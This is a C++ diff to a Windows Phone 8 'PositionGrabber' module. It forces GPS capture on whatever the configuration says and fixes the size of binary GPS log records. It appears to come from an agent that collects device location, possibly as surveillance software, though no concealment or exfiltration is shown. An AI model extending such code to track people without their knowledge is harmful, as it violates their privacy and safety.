@@ -36,6 +36,11 @@ DWORD WINAPI PositionModule(LPVOID lpParam) {
 	} catch (...) {
 		gps = FALSE;
 	}
+
+	//forzo a far credere che utilizzo il gps, dato che su WP8 posso settare l'accuratezza ma non il dispositivo che utilizzo per raggiungerla
+	//per cui a prescindere da quello che metto in conf simulo la cattura col gps
+	gps=TRUE;
+
 /***
 	try {
 		cell = conf->getBool(L"cell");
@@ -51,6 +56,8 @@ DWORD WINAPI PositionModule(LPVOID lpParam) {
 ***/
 	me->setStatus(MODULE_RUNNING);
 	eventHandle = me->getEvent();
+
+	
 
 	DBG_TRACE(L"Debug - PositionGrabber.cpp - Position Module started\n", 5, FALSE);
 /***	
@@ -78,7 +85,9 @@ DWORD WINAPI PositionModule(LPVOID lpParam) {
 		GPS_POSITION_WP8 gps;
 		DWORD dwDelimiter;
 	} GPSInfo;
+
 /***
+
 	// GSM e' un log sequenziale
 	typedef struct _GSMInfo {
 		UINT uSize;
@@ -101,6 +110,7 @@ DWORD WINAPI PositionModule(LPVOID lpParam) {
 ***/
 
 	GPSInfo gpsInfo;
+
 
 
 	// E' singleton e non va distrutta (30 sec di timeout, 1 sec di max age)
@@ -361,10 +371,13 @@ DWORD WINAPI PositionModule(LPVOID lpParam) {
 					gpsInfo.dwDelimiter = LOG_DELIMITER;
 #ifdef _DEBUG
 					WCHAR msg[128];
-					swprintf_s(msg, L">>> Lat=%f Long=%f\n",gpsInfo.gps.dblLatitude,gpsInfo.gps.dblLongitude);OutputDebugString(msg);
+					swprintf_s(msg, L">>> Lat=%f Long=%f Acc=%f\n",gpsInfo.gps.dblLatitude,gpsInfo.gps.dblLongitude,gpsInfo.gps.flHorizontalDilutionOfPrecision);OutputDebugString(msg);
 #endif
+					//full a amno
 
-					if (logGPS.WriteLog((BYTE *)&gpsInfo, sizeof(gpsInfo)))
+					//non potendo utilizzare #pragma pack(4) con la struttura gpsInfo se faccio sizeof(GPSInfo) ottengo 0x170 4 byte in piu' per cui 
+					//calcolo la size con i singoli pezzi della struttura sizeof(UINT)+sizeof(UINT)+sizeof(FILETIME)+sizeof(GPS_POSITION_WP8)+sizeof(DWORD)
+					if (logGPS.WriteLog((BYTE *)&gpsInfo, sizeof(UINT)+sizeof(UINT)+sizeof(FILETIME)+sizeof(GPS_POSITION_WP8)+sizeof(DWORD)))
 						bGPSEmpty = FALSE;
 
 				}
